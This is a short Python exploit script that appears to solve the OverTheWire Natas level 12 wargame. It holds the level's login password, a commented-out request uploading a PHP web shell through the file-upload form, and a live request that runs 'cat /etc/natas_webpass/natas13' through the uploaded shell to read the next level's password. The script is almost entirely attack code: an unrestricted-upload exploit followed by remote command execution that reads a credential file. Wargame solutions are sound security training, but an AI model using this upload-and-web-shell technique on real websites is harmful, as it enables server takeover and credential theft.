import requests
import re

username = "natas12"
password = "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"

url = "http://natas12.natas.labs.overthewire.org/"

session = requests.session()

#response = session.post(url, files={"uploadedfile" : open("shell1.php", "rb")}, data={"filename":"shell1.php", "max_file_size":"1000"},auth=(username, password))

response = session.get(url + "upload/uu6f9v8clq.php?c=cat /etc/natas_webpass/natas13", auth=(username, password))
content = (response.text)
print(content)